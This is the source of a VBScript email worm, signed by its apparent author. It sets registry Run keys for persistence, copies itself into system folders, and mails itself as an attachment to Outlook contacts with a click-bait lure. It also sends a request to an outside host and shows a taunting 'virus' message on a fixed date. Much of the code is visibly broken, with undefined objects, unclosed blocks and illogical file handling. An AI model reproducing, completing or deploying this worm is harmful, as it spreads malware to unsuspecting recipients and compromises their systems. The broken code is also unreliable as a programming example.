Rem Clso Made By Dipsan Dhimal
On Error Resume Next
'VBS/EmailWorm By dipsan.dhimalme@gmail.com
set filesystemobj = createobject("Scripting.FileSystemObject")
set shellobj = wscript.createobject("Wscript.Shell")
wormvirus= ""

shellobj.RegWrite "HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run/Kri", "System=Infected", "REG_SZ"
shellobj.RegWrite "HKCU/SOFTWARE/DipsanDhimal", "Clso", "REG_SZ"

set usd = filesystemobj.OpenTextFile(WScript.ScriptFullName,2)
payloadworm = usd.ReadAll
usd.close

filesystemobj.CopyFile WScript.ScriptFullName, filesystemobj.getspecialfolder(0) & "/Booty.vbs"
filesystemobj.CopyFile WScript.ScriptFullName, filesystemobj.getspecialfolder(1) & "/Booty2.vbs"

If shellobj.RegRead("HKCU/SOFTWARE/DipsanDhimal/Nepali") <> "977" then
    wormMail()
End If

if Month(Now)=3 and Day(Now)=8 then
    temp = wshshell.ExpandEnvironmentStrings("%temp%")
    wshshell.run "%comspec% /c set 3/2/2024"
end if

if Month(Now)=3 and Day(Now)=2 then
    M = MsgBox("YOU JUST GOT VIRUS COMPUTER, SEND TO YOUR FRIEND THIS FILE", vbOK+vbError, "WEEEE OOOOO")
end if

sub Osp
    CodeStart = "'"
    Set WshNetwork = WScript.createobject("Wscript.Network")
    DiskDrive = WshNetwork.EnumNetworkDrive
    if not (fso.DriveExists(DiskDrive)) Then
        set xmlhttp = CreateObject("Msxml2.XmlHttp")
        xmlhttp.Open "Post", "https://avg.np.com", false
        xmlhttp.Send
    end if
end sub

function wormMail()
dim da1, da2, outlook, mapi, coap, coap1, item, mail, cis
set outlook = CreateObject("Outlook.Application")
if rigged = "" then
    rigged = 1
end if

set mapi = outlook.getnamespace("MAPI")
set coap = mapi.getdefaultfolder(2)
if coap.Items.Count <> 1 then
    for Each item in coap.items
        for each itat in item.Attachments
            itat.Delete
        next
        set item = outlook.createitem(0)
        item.to = "microsoft@info.com"
        item.Subject="Check this!"
        item.body="Yo Check This File You Must Click Here"
        item.Attachments.Add WScript.ScriptFullName
        if item.to = "" then
        item.send
        da1 = "FIRST EMAIL"
        cis(i) = Replace(da1, "'", Chr(12))
    next
end if

if outlook = "Outlook"
set coap1 = mapi.getdefault(3)
if coap1.Items.Count <> 1 then
    for Each item in coap1.items
        set mail=outlook.createitem(0)
        set email=item
        mail.to=email & "dipsan.dhimalme@gmail.com"
        mail.Subject="Rid Of Fuck"
        mail.Body="Yo Check This File You Must Click Here"
        mail.Attachments.Add WScript.ScriptFullName
        if mail.to = "" then
        mail.send
        da2 = "SECOND WMAIL"
        cis(i) = Replace(da2, "|", chr(12))
        end if
    next
end if
end if

wshshell.RegWrite "HKCU/SOFTWARE/Microsoft/Windows/CurrentVersion/Outlook", cis, "REG_DZ"
end function

data1 = "I Fuck PC And Worm Have God Damn Died"
data2 = "How Do You Know Mail Are There? Start"
data3 = "101010101010010101010010"
data4 = "101118810000001010101000"
data5 = "3/2/2024 Seted In Time"
data6 = "Some Nepali Help"
data7 = "EmailWorm.VBS.Clso"

wshshell.RegWrite "HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run", fso.GetSpecialFolder(1) & "/wscript.exe"
if b =1 then
    diskc = "c:\"
end if

ci = rnd(Int(Randomize) * Int(Randomize))
select case ci

    case "emailworm"
        app = "Outlook Mail"
    case "pull"
        diskc = "c:\users\disk.vbs"
end select

cacheandcontrol = ""
maxage = 0
maxcode = 10929
Set code = filesystemobj.CreateTextFile("Oi.txt")
code.WriteLine "Outlook: Sended"
code.WriteLine "XmlHttpMsxml2: Posted On avg.np.com"
code.WriteLine "Registry: Writed"
code.Close
'CodeEnd
Rem Clso Made By Dipsan Dhimal
